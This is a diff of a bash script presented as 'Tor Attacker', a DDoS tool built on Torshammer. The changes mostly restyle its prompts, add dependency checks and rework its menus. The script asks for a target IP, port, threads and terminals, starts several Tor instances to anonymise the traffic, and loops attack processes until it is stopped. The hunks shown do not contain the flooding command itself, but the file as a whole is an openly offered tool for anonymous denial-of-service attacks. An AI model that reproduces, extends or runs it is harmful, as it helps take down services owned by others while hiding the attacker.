@@ -1,7 +1,7 @@
 #!/usr/bin/bash
-# AttackTor: DDoS Tool Beta v1.4 using Torshammer
+# Torattacker: DDoS Tool Beta v1.4 using Torshammer
 # Coded by: @thesixtynine
-# Github: github.com/thesixtynine/Tor
+# Github: https://github.com/thesixtynine/Tor
 
 clear
 
@@ -12,6 +12,27 @@ checkroot() {
 if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77m Please, run this program as root!\n\e[0m"
    exit 1
+fi
+
+}
+
+dependencies() {
+
+command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }
+command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."; exit 1; }
+
+command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }
+command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
+command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
+command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
+command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
+command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
+command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }
+
+if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
+echo "/dev/urandom not found!"
+exit 1
 fi
 
 }
@@ -32,7 +53,7 @@ printf "\e[1;35m    ██     ██\e[1;47\e[0m████\e[1;95m██   �
 printf "\e[1;35m    ██     ▀██▄▄██▀   ██      \e[0m\e[1;77m  ░░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀▀▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░░\e[0m\n"
 printf "\e[1;35m    ▀▀       ▀▀▀▀     ▀▀      \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
 printf "\n"
-printf "\e[100m:    TorAttacker Beta v1.4, Coded by: @thesixtynine     :\e[0m\n"
+printf "\e[100m:    Tor Attacker Beta v1.4, Coded by: @thesixtynine     :\e[0m\n"
 printf "\n"
 
 }
@@ -43,24 +64,24 @@ default_portt="80"
 default_threads="600"
 default_tor="y"
 
-read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Target: \e[0m\e[93m' target
+read -p $'\e[0m[\e[1;92m#\e[0m] \e[1;77mTarget \e[0m( IP ): \e[1;77m' target
 
-read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Port \e[0m\e[77m(Default 80): \e[93m' portt
+read -p $'\e[0m[\e[1;93m+\e[0m] \e[1;77mPort \e[0m(Default 80): \e[1;77m' portt
 portt="${portt:-${default_portt}}"
 
-read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Threads: \e[0m\e[77m(Default 600): \e[93m' threads
+read -p $'\e[0m[\e[1;94m@\e[0m] \e[1;77mThreads: \e[0m(Default 600): \e[1;77m' threads
 threads="${threads:-${default_threads}}"
 
-read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Terminals \e[0m\e[77m(Default 4): \e[93m' inst
+read -p $'\e[0m[\e[1;95m$\e[0m] \e[1;77mTerminals \e[0m(Default 4): \e[1;77m' inst
 inst="${inst:-${default_inst}}"
 
-read -e -p $'\e[92m[\e[0m\e[77m?\e[0m\e[92m] Anonymized Via \e[0m\e[105m TOR \e[0m\e[77m (start tor before) \e[0m\e[95m[Y/N]: \e[93m' tor
+read -e -p $'\e[0m[\e[1;96m&\e[0m] \e[1;77mAnonymized Via \e[0m[ TOR ] \e[1;77m(start tor before) \e[0m[Y/n]: \e[1;77m' tor
 printf "\e[0m"
 tor="${tor:-${default_tor}}"
 
 if [[ $tor == "y" || $tor == "Y" ]]; then
 readinst
-printf "\e[1;91m[\e[0m\e[1;77m^\e[1;91] Press Ctrl + C to stop attack \e[0m \n"
+printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPress Ctrl + C to stop attack\n"
 attacktor
 
 else
@@ -73,7 +94,7 @@ readinst() {
 
 default_inst="3"
 
-read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Tor Instances \e[0m\e[77m(default: 3): \e[93m' inst
+read -p $'\e[0m[\e[1;91m/\e[0m] \e[1;77mTor Instances \e[0m(default 3): \e[1;77m' inst
 inst="${inst:-${default_inst}}"
 multitor
 
@@ -101,9 +122,9 @@ done
 attack() {
 
 default_inst="4"
-read -p $'\e[92m[\e[0m\e[77m~\e[0m\e[92m] Terminals \e[0m\e[77m(Default 4): \e[93m' inst
+read -p $'\e[0m[\e[1;94m+\e[0m] \e[1;77mTerminals \e[0m(Default 4): \e[1;77m' inst
 inst="${inst:-${default_inst}}"
-printf "\e[1;91m[\e[0m\e[77m*\e[91m] Press Ctrl + C to stop attack \e[0m \n"
+printf "\e[0m[\e[1;91m!\e[0m] \e[1;77m Press Ctrl + C to stop attack\n"
 i=1
 while true; do
   let i=1
@@ -125,26 +146,28 @@ checkcount=0
 
 while [[ $i -le $inst ]]; do
 port=$((9050+$i))
-printf "\e[96m[\e[0m\e[77m#\e[0m\e[96m] Checking Tor connection on port:\e[0m\e[77m %s\e[0m..." $port
+printf "\e[0m[\e[1;93m*\e[0m] \e[1;77mChecking Tor connection on port:\e[0m %s\e[0m..." $port
 check=$(curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null; echo $?)
 
 if [[ "$check" -gt 0 ]]; then
-printf "\e[91mFailed!\e[0m\n"
+printf "\e[0mFailed!\n"
 
 else
-printf "\e[1;94mOk!\e[0m\n"
+printf "\e[0mOk!\n"
 let checkcount++
 fi
 i=$((i+1))
 done
 
 if [[ $checkcount != $inst ]]; then
-printf "\e[1;94m[\e[0m\e[1;77m-\e[1;94m] It Requires All Tor Running!\e[0m\n"
-printf "\e[1;97m(1) Check Again\e[0m\n"
-printf "\e[1;97m(2) Restart\n\e[0m"
-printf "\e[1;97m(3) Exit\n\e[0m"
+echo
+printf "\e[0m[\e[1;94m1\e[0m] \e[1;77mIt Requires All Tor Running!\n"
+printf "\e[0m[\e[1;94m2\e[0m] \e[1;77mCheck Again\n"
+printf "\e[0m[\e[1;94m3\e[0m] \e[1;77mRestart\n"
+printf "\e[0m[\e[1;94m0\e[0m] \e[1;77mExit\n"
+echo
 
-read -p $'\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Choose an option: \e[0m' fail
+read -p $'\e[0m[\e[1;92m+\e[0m] \e[1;77mChoose an option: \e[0m' fail
 
 if [[ $fail == "1" ]]; then
 checktor
@@ -154,15 +177,20 @@ stop
 multitor
 
 elif [[ $fail == "3" ]]; then
+clear
+banner
+config
+
+elif [[ $fail == "0" ]]; then
 echo
-printf "\e[1;91m[\e[0m\e[1;77m!\e[1;91m] Exit The Programm!\e[0m\n"
+printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mExit The Programm!\n"
 echo
 sleep 1
-exit
+exit 1
 
 else
 echo
-printf "\e[1;92m[\e[0m\e[1;77m!\e[1;92m] Invalid Option!\e[0m\n"
+printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mInvalid Option!\n"
 echo
 sleep 1
 clear
@@ -175,6 +203,7 @@ fi
 
 multitor() {
 
+echo
 if [[ ! -d multitor ]]; then
 mkdir multitor;
 fi
@@ -185,7 +214,7 @@ let i=1
 while [[ $i -le $inst ]]; do
 port=$((9050+$i))
 printf "SOCKSPort %s\nDataDirectory /var/lib/tor%s" $port $i > multitor/multitor$i.
-printf "\e[95m[\e[0m\e[77m*\e[0m\e[95m] Starting Tor On Port:\e[0m\e[1;77m 905%s\e[0m\n" $i.
+printf "\e[0m[\e[1;92m*\e[0m] \e[1;77mStarting Tor On Port:\e[0m 905%s\e[0m\n" $i.
 tor -f multitor/multitor$i > /dev/null &
 sleep 10
 i=$((i+1))
@@ -197,10 +226,14 @@ checktor
 stop() {
 
 killall -2 tor > /dev/null 2>&1
-printf "\e[1;91m[\e[0m\e[1;77mx\e[1;91m] All Tor Connection Stopped.\e[0m\n"
+echo
+printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mAll Tor Connection Stopped.\e[0m\n"
+echo
 
 }
 
+#checkroot
+#checktor
+#dependencies
 banner
-checkroot
 config
